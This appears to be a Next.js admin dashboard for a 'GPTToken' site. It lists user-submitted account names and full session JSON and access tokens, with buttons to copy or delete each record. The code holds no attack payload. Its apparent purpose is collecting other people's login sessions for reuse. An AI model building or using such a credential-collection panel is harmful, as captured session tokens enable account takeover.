'use client';

import { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';

interface Token {
    id: number;
    accountName: string;
    sessionData: string;
    accessToken: string | null;
    createdAt: string;
}

export default function AdminDashboard() {
    const [tokens, setTokens] = useState<Token[]>([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState('');
    const [copiedId, setCopiedId] = useState<number | null>(null);
    const [deletingId, setDeletingId] = useState<number | null>(null);
    const [adminEmail, setAdminEmail] = useState('');
    const router = useRouter();

    const fetchTokens = useCallback(async () => {
        const token = localStorage.getItem('adminToken');

        if (!token) {
            router.push('/admin');
            return;
        }

        try {
            const response = await fetch('/api/tokens', {
                headers: {
                    'Authorization': `Bearer ${token}`,
                },
            });

            if (response.status === 401) {
                localStorage.removeItem('adminToken');
                localStorage.removeItem('adminEmail');
                router.push('/admin');
                return;
            }

            const data = await response.json();

            if (response.ok) {
                setTokens(data.tokens);
            } else {
                setError(data.error);
            }
        } catch {
            setError('获取数据失败');
        } finally {
            setLoading(false);
        }
    }, [router]);

    useEffect(() => {
        const email = localStorage.getItem('adminEmail');
        if (email) setAdminEmail(email);
        fetchTokens();
    }, [fetchTokens]);

    const handleCopy = async (sessionData: string, id: number) => {
        try {
            await navigator.clipboard.writeText(sessionData);
            setCopiedId(id);
            setTimeout(() => setCopiedId(null), 2000);
        } catch {
            // Fallback for older browsers
            const textArea = document.createElement('textarea');
            textArea.value = sessionData;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            setCopiedId(id);
            setTimeout(() => setCopiedId(null), 2000);
        }
    };

    const handleDelete = async (id: number) => {
        if (!confirm('确定要删除这条记录吗？')) {
            return;
        }

        const token = localStorage.getItem('adminToken');
        if (!token) return;

        setDeletingId(id);

        try {
            const response = await fetch(`/api/tokens?id=${id}`, {
                method: 'DELETE',
                headers: {
                    'Authorization': `Bearer ${token}`,
                },
            });

            if (response.ok) {
                setTokens(tokens.filter(t => t.id !== id));
            } else {
                const data = await response.json();
                alert(data.error || '删除失败');
            }
        } catch {
            alert('删除失败，请稍后重试');
        } finally {
            setDeletingId(null);
        }
    };

    const handleLogout = () => {
        localStorage.removeItem('adminToken');
        localStorage.removeItem('adminEmail');
        router.push('/admin');
    };

    const formatDate = (dateStr: string) => {
        const date = new Date(dateStr);
        return date.toLocaleString('zh-CN', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
        });
    };

    if (loading) {
        return (
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100vh' }}>
                <div className="spinner" style={{ width: '40px', height: '40px', borderWidth: '3px', borderTopColor: 'var(--primary)' }}></div>
            </div>
        );
    }

    return (
        <>
            <header className="header">
                <a href="/" className="logo" style={{ textDecoration: 'none' }}>
                    <div className="logo-icon">🔑</div>
                    <span>GPT<span style={{ color: 'var(--primary)' }}>Token</span></span>
                </a>
                <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                    <span style={{ fontSize: '14px', color: 'var(--text-secondary)' }}>
                        👤 {adminEmail}
                    </span>
                    <button onClick={handleLogout} className="btn btn-secondary" style={{ padding: '8px 16px', fontSize: '14px' }}>
                        退出登录
                    </button>
                </div>
            </header>

            <main className="page-container-wide">
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '24px' }}>
                    <div>
                        <h1 style={{ fontSize: '24px', fontWeight: '700' }}>Token 提交记录</h1>
                        <p style={{ color: 'var(--text-secondary)', marginTop: '4px' }}>
                            共 {tokens.length} 条记录
                        </p>
                    </div>
                    <button onClick={fetchTokens} className="btn btn-outline" style={{ padding: '10px 20px' }}>
                        🔄 刷新
                    </button>
                </div>

                {error && (
                    <div className="alert alert-error" style={{ marginBottom: '24px' }}>
                        {error}
                    </div>
                )}

                {tokens.length === 0 ? (
                    <div className="card" style={{ textAlign: 'center', padding: '60px 20px' }}>
                        <div style={{ fontSize: '48px', marginBottom: '16px' }}>📭</div>
                        <h3 style={{ fontSize: '18px', color: 'var(--text-secondary)' }}>暂无提交记录</h3>
                        <p style={{ color: 'var(--text-muted)', marginTop: '8px' }}>等待用户提交 Token</p>
                    </div>
                ) : (
                    <div className="card" style={{ padding: '0', overflow: 'hidden' }}>
                        <div className="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th style={{ width: '60px' }}>ID</th>
                                        <th style={{ width: '150px' }}>账号名称</th>
                                        <th style={{ width: '180px' }}>提交时间</th>
                                        <th>Session 数据</th>
                                        <th style={{ width: '200px', minWidth: '200px' }}>操作</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {tokens.map((token) => (
                                        <tr key={token.id}>
                                            <td>
                                                <span className="badge badge-primary">#{token.id}</span>
                                            </td>
                                            <td>
                                                <strong>{token.accountName}</strong>
                                            </td>
                                            <td style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                                                {formatDate(token.createdAt)}
                                            </td>
                                            <td className="session-data">
                                                <div className="session-preview" title={token.sessionData}>
                                                    {token.sessionData.substring(0, 60)}...
                                                </div>
                                            </td>
                                            <td>
                                                <div style={{ display: 'flex', gap: '8px', flexWrap: 'nowrap' }}>
                                                    <button
                                                        onClick={() => handleCopy(token.sessionData, token.id)}
                                                        className={`copy-btn ${copiedId === token.id ? 'copied' : ''}`}
                                                    >
                                                        {copiedId === token.id ? '✓ 已复制' : '📋 复制'}
                                                    </button>
                                                    <button
                                                        onClick={() => handleDelete(token.id)}
                                                        className="copy-btn"
                                                        style={{
                                                            background: deletingId === token.id ? 'var(--danger)' : undefined,
                                                            color: deletingId === token.id ? 'white' : 'var(--danger)',
                                                            borderColor: 'var(--danger)'
                                                        }}
                                                        disabled={deletingId === token.id}
                                                    >
                                                        {deletingId === token.id ? '删除中...' : '🗑️ 删除'}
                                                    </button>
                                                </div>
                                            </td>
                                        </tr>
                                    ))}
                                </tbody>
                            </table>
                        </div>
                    </div>
                )}

                <div className="alert alert-warning" style={{ marginTop: '24px' }}>
                    <span style={{ fontSize: '20px' }}>💡</span>
                    <div>
                        <strong>提示</strong>
                        <p style={{ marginTop: '4px', fontSize: '13px' }}>
                            点击「复制」按钮可复制完整的 Session JSON 数据，数据将原样复制，不会有任何修改。
                        </p>
                    </div>
                </div>
            </main>
        </>
    );
}
